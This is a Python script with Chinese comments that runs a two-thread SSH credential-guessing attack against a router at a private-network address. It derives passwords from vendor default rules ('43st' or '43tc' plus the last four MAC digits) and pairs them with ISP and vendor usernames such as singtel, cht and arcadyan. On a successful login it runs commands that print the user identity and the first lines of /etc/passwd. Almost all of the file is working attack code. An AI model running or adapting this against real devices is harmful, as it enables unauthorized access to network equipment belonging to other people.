#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""并发版 SSH 派生凭证测试：按可能性排序，2 路并发。"""
import paramiko, warnings, logging, sys, time, threading, queue
warnings.filterwarnings('ignore')
logging.disable(logging.CRITICAL)

HOST = '192.168.3.20'
MAC4 = '202e'
HIT = threading.Event()
lock = threading.Lock()
tried = [0]
start = time.time()


def build():
    """按可能性从高到低生成候选"""
    c = []
    # 第一梯队：最贴近中华电信那条规则
    for u in ['st', 'singtel', 'sintel', 'user', 'cht']:
        for p in ['43st' + MAC4, '43st' + MAC4.upper(), '43tc' + MAC4, '43ST' + MAC4]:
            c.append((u, p))
    # 第二梯队：用户名变化
    for u in ['admin', 'root', 'support', 'eng', 'operator', 'arcadyan', 'owl']:
        for p in ['43st' + MAC4, '43st' + MAC4.upper(), '43tc' + MAC4]:
            c.append((u, p))
    # 第三梯队：只用密码，用户名沿用常见的
    for u in ['st', 'singtel', 'sintel', 'cht', 'user', 'admin', 'root']:
        for p in ['43st', '43tc', 'st' + MAC4, MAC4, '43st' + MAC4 + MAC4]:
            c.append((u, p))
    # 去重
    seen = set()
    out = []
    for u, p in c:
        if (u, p) not in seen:
            seen.add((u, p))
            out.append((u, p))
    return out


CANDS = build()
q = queue.Queue()
for x in CANDS:
    q.put(x)
print("候选 %d 组，2 路并发" % len(CANDS), flush=True)


def worker():
    while not q.empty() and not HIT.is_set():
        try:
            u, p = q.get_nowait()
        except queue.Empty:
            return
        c = paramiko.SSHClient()
        c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            c.connect(HOST, port=22, username=u, password=p, timeout=8,
                      allow_agent=False, look_for_keys=False)
            HIT.set()
            print("\n★★★★★★ 成功！ 用户名=%r  密码=%r" % (u, p), flush=True)
            i, o, e = c.exec_command('id; uname -a; cat /etc/passwd|head -5; ls /')
            print(o.read().decode('utf-8', 'replace')[:800], flush=True)
            c.close()
            return
        except paramiko.AuthenticationException:
            pass
        except Exception as ex:
            print("  连接异常 %s/%s: %s" % (u, p, str(ex)[:50]), flush=True)
        finally:
            try:
                c.close()
            except Exception:
                pass
            with lock:
                tried[0] += 1
                if tried[0] % 25 == 0:
                    el = time.time() - start
                    print("  已试 %d/%d  (%.1fs, %.2fs/组)"
                          % (tried[0], len(CANDS), el, el / tried[0]), flush=True)


ts = [threading.Thread(target=worker, daemon=True) for _ in range(2)]
for t in ts:
    t.start()
for t in ts:
    t.join()

if not HIT.is_set():
    print("\n%d 组都没成功，用时 %.0fs" % (tried[0], time.time() - start), flush=True)
